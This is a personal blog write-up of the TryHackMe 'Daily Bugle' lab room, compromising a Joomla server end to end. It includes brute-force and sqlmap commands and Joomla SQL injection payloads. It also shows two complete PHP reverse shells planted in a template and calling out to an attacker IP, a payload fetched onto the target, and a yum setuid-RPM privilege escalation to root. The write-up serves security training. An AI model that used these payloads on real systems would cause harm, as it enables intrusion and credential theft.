---
title: "DailyBugle_writeup.sh"
date: 2020-08-28T22:07:08-04:00
draft: false
toc: true
cover: "img/dailyBugle_cover.gif"
tags:
  - hacking
  - tryHackme
  - writeups
---

# Daily Bugle - THM Room

This is a writeup or another one of my noob friendly(I hope) post-thingy for Daily Bugle TryhackMe's room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. Yup, I also write down my failed attempts to better illustrate my derailed train of thought. 

You have been warned :)

Enjoy!

- Please visit This room on TryHackMe by [clicking this link](https://tryhackme.com/room/dailybugle).
- **PLEASE NOTE:** Passwords and flag values were intentionally redacted as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.



[TASK 1] Deploy
----------------

> Question #1: Access the web server, who robbed the bank?

Let's start as usual by running an nmap scan:

```sh
┌──(kali㉿kali)-[~/Documents/THM/dailyBugle]
└─$ nmap -A -T4 10.10.179.65 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-27 12:40 EDT
Nmap scan report for 10.10.179.65
Host is up (0.37s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.17 seconds

```

Let's see whats being served on port 80:

![Daily Bugle Home page](https://i.imgur.com/C4X3R75.png)

The information on this page gives us the answer to the first question.



[Task 2] Obtain user and root 
-----------------------------

> Question #1 What is the Joomla Version?

There is no visible information on the page that reveals the version. We can look into the source code, but before we do that. Let's capture with Burp a login request and put Hydra to work on trying to brute force access for us:

This is the request as captured in Burp:

```sh
POST /index.php/component/users/?task=user.login&Itemid=101 HTTP/1.1
Host: 10.10.179.65
Content-Length: 169
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.179.65
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.179.65/index.php/component/users/?view=login&Itemid=101
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: eaa83fe8b963ab08ce9ab7d4a798de05=egb2jrelr81kl1mi493gfkf544; 2b01af51830ca9615359108de04d9ca1=ulpsk0o9dmfa0ms8ebohvbs0n5
Connection: close

username=spiderman&password=test&return=aHR0cDovLzEwLjEwLjE3OS42NS9pbmRleC5waHAvY29tcG9uZW50L3VzZXJzLz92aWV3PWxvZ2luJkl0ZW1pZD0xMDE%3D&0ba84fa157b8f604f997575d184e2636=1
```


With this info let's put together an hydra attack:

```sh
┌──(kali㉿kali)-[~/Documents/THM/dailyBugle]
└─$ hydra -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/rockyou.txt 10.10.179.65 http-post-form "/index.php/component/users/?task=user.login&Itemid=101:username=^USER^&password=^PASS^&Submit=&option=com_users&task=user.login&return=aHR0cDovLzEwLjEwLjE3OS42NS9pbmRleC5waHAvMi11bmNhdGVnb3Jpc2VkLzEtc3BpZGVyLW1hbi1yb2JzLWJhbms%3D&9b46f637d905f7985fcefd95b0e502de=1:F=Username and password do not match or you do not have an account yet." -V 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-27 12:59:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11862817973 login tries (l:827/p:14344399), ~741426124 tries per task
[DATA] attacking http-post-form://10.10.207.42:80/index.php:username=^USER^&password=^PASS^&Submit=&option=com_users&task=user.login&return=aHR0cDovLzEwLjEwLjE3OS42NS9pbmRleC5waHAvMi11bmNhdGVnb3Jpc2VkLzEtc3BpZGVyLW1hbi1yb2JzLWJhbms%3D&9b46f637d905f7985fcefd95b0e502de=1:F=Username and password do not match or you do not have an account yet.
[ATTEMPT] target 10.10.207.42 - login "!root" - pass "123456" - 1 of 11862817973 [child 0] (0/0)
[ATTEMPT] target 10.10.207.42 - login "!root" - pass "12345" - 2 of 11862817973 [child 1] (0/0)
[ATTEMPT] target 10.10.207.42 - login "!root" - pass "123456789" - 3 of 11862817973 [child 2] (0/0)

```

That attack will take a while, let's check the source code of the site to see if it reaveals the version somewhere.
Spoiler alert! The source code revealed nothing. However, we still now it is running Joomla.


Let's fire up a **joomscan** scan:

```sh
    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.179.65 ...

[+] FireWall Detector
[++] Firewall not detected
[+] Detecting Joomla Version
[++] Joomla {REDACTED}                              
[+] Core Joomla Vulnerability              
[++] Target Joomla core is not vulnerable                                                                                                                                                                         
[+] Checking Directory Listing       
http://10.10.179.65/administrator/components
http://10.10.179.65/administrator/modules
http://10.10.179.65/administrator/templates
http://10.10.179.65/images/banners   
                                                                                                                                                       
[+] Checking apache info/status files
[++] Readable info/status files are not found
[+] admin finder                    
[++] Admin page: http://10.10.179.65/administrator/
[+] Checking robots.txt existing      
[++] robots.txt is found           
path : http://10.10.179.65/robots.txt
                                                                                                                                                                                     
Interesting path found from robots.txt
http://10.10.179.65/joomla/administrator/   
http://10.10.179.65/administrator/          
http://10.10.179.65/bin/          
http://10.10.179.65/cache/          
http://10.10.179.65/cli/          
http://10.10.179.65/components/          
http://10.10.179.65/includes/          
http://10.10.179.65/installation/          
http://10.10.179.65/language/          
http://10.10.179.65/layouts/          
http://10.10.179.65/libraries/          
http://10.10.179.65/logs/          
http://10.10.179.65/modules/          
http://10.10.179.65/plugins/          
http://10.10.179.65/tmp/          
                              
[+] Finding common backup files name
[++] Backup files are not found    
[+] Finding common log files name 
[++] error log is not found        
[+] Checking sensitive config.php.x file
[++] Readable config files are not found

Your Report : reports/10.10.179.65/         
```

And with that we get the Joomla version. Also it is worth mentionning that the **hydra** attack attempt did not work: 

	- Me: maybe I did something wrong?
	- The voice in my head: Most likely.


[Task 2] Question #2: What is Jonah's cracked password?
-----------------------------------------------

If we search for joomla exploits for the version we found, we see there is a couple available:


```sh
┌──(kali㉿kali)-[~]
└─$ searchsploit joomla {REDACTED}
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                         |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! {REDACTED}- 'com_fields' SQL Injection                                                         | php/webapps/{REDACTED}.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                          | php/webapps/43488.txt
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The first one seems to be exactly for the version we have. Let's open it up to see what it is about:


```bash
# Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917


URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27


Using Sqlmap: 

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)

```

It seems we can exploit this version by using a SQLMap commnad. However, while searching for the CVE Number related to this vulnerability we see there is a python script available. Which could be what the room suggests instead of goind the SQLi way. Let's look at that first.

- Download the Script: From [this link](https://github.com/XiphosResearch/exploits/tree/master/Joomblah).

Please be aware that in order for this script to work I had to install the following first:

```sh
sudo apt install python-pip -y
pip install requests
```

Then I was able to execute the script, it was quite fast and just required the URL:

```sh
┌──(kali㉿kali)-[~/Documents/THM/dailyBugle]
└─$ python joomblah.py http://10.10.61.166:80
                                                                                                                                                                                                                            
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/{REDACTED}VMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session

```

The script gives us the password hash, let's use **hashcat** to try and crack it. Save the extracted hash to a file and then let's try to detect which hash type we are dealing with:

```sh
┌──(kali㉿kali)-[~/Documents/THM/dailyBugle]
└─$ hashid '$2y$10$0veO/{REDACTED}jVMw.V.d3p12kBtZutm'         
Analyzing '$2y$10$0veO/{REDACTED}VMw.V.d3p12kBtZutm'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 

``` 

Now let's try to crack it with hashcat, this might take a **while** depending your system, seriously. But eventually we'll get it:


```sh
┌──(kali㉿kali)-[~/Documents/THM/dailyBugle]
└─$ hashcat -m3200 -a0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-AMD Ryzen 7 3800X 8-Core Processor, 10871/10935 MB (4096 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s


$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:{REDACTED}
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p...BtZutm
Time.Started.....: Fri Aug 28 19:23:14 2020 (7 mins, 14 secs)
Time.Estimated...: Fri Aug 28 19:30:28 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      108 H/s (13.91ms) @ Accel:4 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 46848/14344385 (0.33%)
Rejected.........: 0/46848 (0.00%)
Restore.Point....: 46824/14344385 (0.33%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:960-1024
Candidates.#1....: supaman -> smokers

Started: Fri Aug 28 19:22:38 2020
Stopped: Fri Aug 28 19:30:29 2020
```

Now that we got a password, let's log into Joomla admin:

Note: We also can log in into the non-admin section of the blog, but what we really want is that **/administrator/** path that we found earlier.

![Logged in as Jonah](https://i.imgur.com/91n6CmU.png)


Let's see if we can add a new post, but the code being a php reverse shell. Not sure if this will work:


Looking around for PHP Reverse shells, I found this one [here](https://gist.github.com/rshipp/eee36684db07d234c1cc)


```php
/*<?php /**/ error_reporting(0); $ip = '10.13.0.34'; $port = 2112; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

We paste that in the view code of the blog entry:

![blog entry source code view](https://i.imgur.com/PhmwKsJ.png)

Let's fire up a netcat listener:

```sh
┌──(kali㉿kali)-[~/Documents/THM/dailyBugle]
└─$ nc -nlvp 2112                                              
listening on [any] 2112 ...

```
Now let's publish the blog post and see if it gets triggered right there or if we need to visit it. This might not work at all if the post code is not processed as PHP code at all.

That did not work at all. The code of the blog post is not executed as php code, even if it is. We need to find how to upload a file possibly.

[Googling... Please wait]


We try to add php file extension as one of the permitted formats for uploading media:

![We try to add php as a valid upload format](https://i.imgur.com/GOiuW3p.png)

That did not work either...


Another thing we can try is using the templates administration panel, with any of the templates we find a file to edit and include our exploit.
This seems to kind of work, we do get a connection back to our netcat listener but it closes right after and does not seems to respond to any command.

![Using a template file with explioit and preview feature](https://i.imgur.com/Y1MLMpv.png)

Since this kid of works, I'd like to try another variation of a PHP Rev shell, lets see what we find:


I found [this interesting site](https://alamot.github.io/reverse_shells/), which has a php one-liner from pentestmonkey that could try, looks kind of similar to the one we have. We need to update IP and PORT. Then we do the same as before, using any php of a template in the templates manager we add our code and save. Then we trigger the "Preview Template" as before.


```php
// pentestmonkey one-liner ^_^
<?php set_time_limit (0); $VERSION = "1.0"; $ip = "10.13.0.34"; $port = 2112; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = "uname -a; w; id; /bin/bash -i"; $daemon = 0; $debug = 0; if (function_exists("pcntl_fork")) { $pid = pcntl_fork(); if ($pid == -1) { printit("ERROR: Cannot fork"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit("Error: Cannot setsid()"); exit(1); } $daemon = 1; } else { printit("WARNING: Failed to daemonise.  This is quite common and not fatal."); } chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit("$errstr ($errno)"); exit(1); } $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit("ERROR: Cannot spawn shell"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit("Successfully opened reverse shell to $ip:$port"); while (1) { if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; } if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit("SOCK READ"); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit("STDOUT READ"); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit("STDERR READ"); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) {  if (!$daemon) { print "$string\\n"; } } ?>

```


This time it works! we have our basic reverse shell working.

![](https://i.imgur.com/AjMcgoj.png)

Let's see if we can answer the following room question now.


[TASK 2] Question #3: What is the user flag?
--------------------------------------------


Let's see if we can get us a better shell:

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
```

That did not work. Let's create an HTTP server to serve our friend **linpeas.sh**

```sh
┌──(kali㉿kali)-[/opt/privilege-escalation-awesome-scripts-suite/linPEAS]
└─$ sudo python -m SimpleHTTPServer                                                                                                      1 ⨯
Serving HTTP on 0.0.0.0 port 8000 ...
```

In our revshell we type in the following wget command to and get our file loaded to the server:

```sh
bash-4.2$ wget http:/10.13.0.34:8000/linPeas.sh
wget http:/10.13.0.34:8000/linPeas.sh
--2020-08-28 20:30:51--  ftp://http//10.13.0.34:8000/linPeas.sh
           => 'linPeas.sh'
Resolving http (http)... failed: Name or service not known.
wget: unable to resolve host address 'http'
bash-4.2$ wget http://10.13.0.34:8000/linpeas.sh
wget http://10.13.0.34:8000/linpeas.sh
--2020-08-28 20:31:25--  http://10.13.0.34:8000/linpeas.sh
Connecting to 10.13.0.34:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 235695 (230K) [text/x-sh]
Saving to: 'linpeas.sh'

100%[======================================>] 235,695      154KB/s   in 1.5s   

2020-08-28 20:31:28 (154 KB/s) - 'linpeas.sh' saved [235695/235695]

bash-4.2$ chmod +x linpeas.sh
chmod +x linpeas.sh
bash-4.2$ 
```

Now we run linpeas, assuming it let us. And yep it did. I don't think pasting the output of linpeas would help to this already **not-short-at-all** writeup.


Looking throuhg the results I see we find some users and groups and a password (also a hash):

```sh
[+] Last time logon each user
Username         Port     From             Latest                                                                                 
root             pts/0    netwars          Mon Dec 16 05:11:46 -0500 2019
jjameson         pts/0    netwars          Mon Dec 16 05:14:55 -0500 2019

[+] Password policy
PASS_MAX_DAYS   99999                                                                                                             
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512

[+] Searching passwords in config PHP files
        public $password = '{REDACTED}';   

[+] Searching specific hashes inside files - less false positives (limit 70)

/var/www/html/libraries/vendor/ircmaxell/password-compat/lib/password.php:$2y$04$usesomesi{REDACTED}8K30oukPsA.ztMG 

```

We can crack that hash but not sure it is anything useful:

```sh
┌──(kali㉿kali)-[~/Documents/THM/dailyBugle]
└─$ hashcat -m3200 -a0 hash2.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-AMD Ryzen 7 3800X 8-Core Processor, 10871/10935 MB (4096 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$2y$04$use{REDACTED}oG8K30oukPsA.ztMG:{REDACTED}
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2y$04$us{REDACTED}LeakoG8K30ou...A.ztMG
Time.Started.....: Fri Aug 28 20:45:18 2020 (0 secs)
Time.Estimated...: Fri Aug 28 20:45:18 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2487 H/s (10.06ms) @ Accel:8 Loops:16 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 48/14344385 (0.00%)
Rejected.........: 0/48 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-16
Candidates.#1....: 123456 -> 1234567890

Started: Fri Aug 28 20:45:17 2020
Stopped: Fri Aug 28 20:45:20 2020

```

As it turns out the output from linpeas already revealed a password we can use, if you look for it under public PHP configs you'll find it, **jjameson:{REDACTED}**


From there we can get the user flag:

```sh
bash-4.2$ su jjameson
su jjameson
Password: {REDACTED}

[jjameson@dailybugle tmp]$ cd ~
cd ~
[jjameson@dailybugle ~]$ ls
ls
user.txt
[jjameson@dailybugle ~]$ cat user.txt
cat user.txt
27a{REDACTED_USER_FLAG}442e
[jjameson@dailybugle ~]$ 
```

[TASK 2] Question #3: What is the root flag?
--------------------------------------------


If we run **sudo -l** we see that jjameson can run something called *yum*, I'll have to google what that is. Before we do that, let's run linpeas again with our newly adquired jjameson user:

Looking around the web I came across this other exploitiation for Yum. Check it out [here](https://lsdsecurity.com/2019/01/more-linux-privilege-escalation-yum-rpm-dnf-nopasswd-rpm-payloads/).

It looks like this:

```base64
+Vippeef3FNn/eckVFlbk6H9rGKz//P672KD2D8Ws/7/v7E5o0r4wSj
pNhnztp+T2THrB6N9MXlQJfds/pfeVT/9f6GX/vb2Ff2bbpcXWO1/GL52+bCsv7PPYvWu2VKXzp8
U27t78zLwbct9h+/t/NHonrLlMrQz7PeX3BfXyW8tWuz/+OnN6aw/lLr7X15KfPY3aNTqr+oyloX
SZRsrjU5nynm2p/ZqFq1ONqSX9C24vGezv3fIuxd9S+mm7/KvJkv/3iLuov9yUKpkmV3PNbcPncv
x/qzc/QXT/anZ0uizu3a8mhnv79y3t+XjAyo4MfrOuYZiV0TGDQYGFISSxLhSUGBiNRkaoIlNVy+
nL7A0oCBqTg42ICX5YXJjNyMnKSUhJyMFJaw9LSEvGMLEryqlxsaTBGbriKmqXHh8KqDHF++XPaa
vJl70+XMGXwe/fXFwcnNF38sZ3c4Uh9Vty+ukE33DYPrhpmdnO9+mBu5HtnfKdjcqBhgafCPN+Oh
RInBocfxkYH2msb++y2au7nPeHixGLHfClzckOfgv3/Ljo5juQxGr+qLmT9f/DRfjkHo/1HJTteV
Jt6sKsf3L2xsXPgw489lZoXj9V51Rr6XGCQ/5mdZ3fq3nNuh//+jpjl/zgi9UmO+9Pj+iQM1W/76
izco/5tsLPT5UnDxp8tfL63W2NYc8Pv+iQscuv98e3x93W7//8Lw6a4MT/Zyi2MGhp/nfXqWbSRQ
WB0h+W/i/muGWWVh5ftdg5wuKW7cE7xHLWZZtO27N3M/b7rzrtaif0nZC83L6Z97Xuk+l9J5W/x/
/+znftHLGC73snb9n/7FVuRa/7ttNUrhvyKdY/qz/QrOn98Sd1Th+9Pi7a36H7xT/HVj9CL2BqWd
vGXM3bxkUfmqP9o39f5vrFvQnCjS0xRowOV2UEOCdXECFk6bLAND7aMfHaAUAACKx3++WAQAAA==
```

The page says we need to make sure to save it as

```sh
# Again, be sure to save as .txt  
cat *.txt |base64 -d|gzip -d > debsploit.deb
```

Looking around a bit more I saw [this other post](https://evi1ox.github.io/post/%E6%BB%A5%E7%94%A8sudo%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/)



```sh
curl -sfL https://gist.githubusercontent.com/neoice/797777cb0832f596a70b6cba7bbbcc4f/raw/f3f94e105c23d2c01706736d9cd729dd555e9c53/setuid-pop.rpm | base64 -d | gzip -d> yumsploit.rpm

```

trying to run this on the remote machine seems to be failing, we'll generate the payload rpm locally(which means just run that command and serve in our local HTTP server the yumsploit.rpm file)

Then we just do wget to upload that file and will try to install it with **sudo yum localinstall yumsploit.rpm** and hope for the best:

```sh
──(kali㉿kali)-[~/Documents/THM/dailyBugle]
└─$ ssh jjameson@10.10.61.166                                                                                             1 ⨯
jjameson@10.10.61.166's password: 
Last login: Fri Aug 28 21:48:55 2020
[jjameson@dailybugle ~]$ ls
user.txt
[jjameson@dailybugle ~]$ wget http://10.13.0.34:8000/yumsploit.rpm
--2020-08-28 21:51:03--  http://10.13.0.34:8000/yumsploit.rpm
Connecting to 10.13.0.34:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8267 (8.1K) [application/x-redhat-package-manager]
Saving to: ‘yumsploit.rpm’

100%[====================================================================================>] 8,267       --.-K/s   in 0.003s  

2020-08-28 21:51:04 (2.79 MB/s) - ‘yumsploit.rpm’ saved [8267/8267]

[jjameson@dailybugle ~]$ sudo yum localinstall yumsploit.rpm
Loaded plugins: fastestmirror
Examining yumsploit.rpm: sploit-1.0-1.x86_64
Marking yumsploit.rpm to be installed
Resolving Dependencies
--> Running transaction check
---> Package sploit.x86_64 0:1.0-1 will be installed
--> Finished Dependency Resolution

Dependencies Resolved

==============================================================================================================================
 Package                      Arch                         Version                     Repository                        Size
==============================================================================================================================
Installing:
 sploit                       x86_64                       1.0-1                       /yumsploit                       8.5 k

Transaction Summary
==============================================================================================================================
Install  1 Package

Total size: 8.5 k
Installed size: 8.5 k
Is this ok [y/d/N]: y
Downloading packages:
Running transaction check
Running transaction test
Transaction test succeeded
Running transaction
  Installing : sploit-1.0-1.x86_64                                                                                        1/1 
  Verifying  : sploit-1.0-1.x86_64                                                                                        1/1 

Installed:
  sploit.x86_64 0:1.0-1                                                                                                       

Complete!
[jjameson@dailybugle ~]$ 

```


It seems to have succeded, let see if we have the expected way to rooting this room:

```sh
[jjameson@dailybugle ~]$ ls -al /usr/local/bin/
total 12
drwxr-xr-x.  2 root root   17 Aug 28 21:54 .
drwxr-xr-x. 12 root root  131 Dec 14  2019 ..
-rwsr-sr-x   1 root root 8744 Jan 18  2019 pop
```

We have a **pop** file we can execute now!

```sh
[jjameson@dailybugle ~]$ /usr/local/bin/pop
[root@dailybugle ~]# whoami
root
[root@dailybugle ~]# id
uid=0(root) gid=0(root) groups=0(root),1000(jjameson)
[root@dailybugle ~]# 

```

We made it! we rooted it! Let's grab that flag and get ready for a deserved time off the screen.


```sh
[root@dailybugle ~]# ls
user.txt  yumsploit.rpm
[root@dailybugle ~]# cd ..
[root@dailybugle home]# cd ..
[root@dailybugle /]# ls
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
[root@dailybugle /]# cd root
[root@dailybugle root]# ls
anaconda-ks.cfg  root.txt
[root@dailybugle root]# cat root.txt
eec{REDACTED_ROOT_FLAG}fa6f79
```


A lot of failed attempts to get this one, but it was definitely fun! I learnt a lot by failing with my approaches, having to reasearch and finally being able to step by step root this room! I hope you enjoy it as well.

As usual, happy hacking.

{{< thm_badge >}}

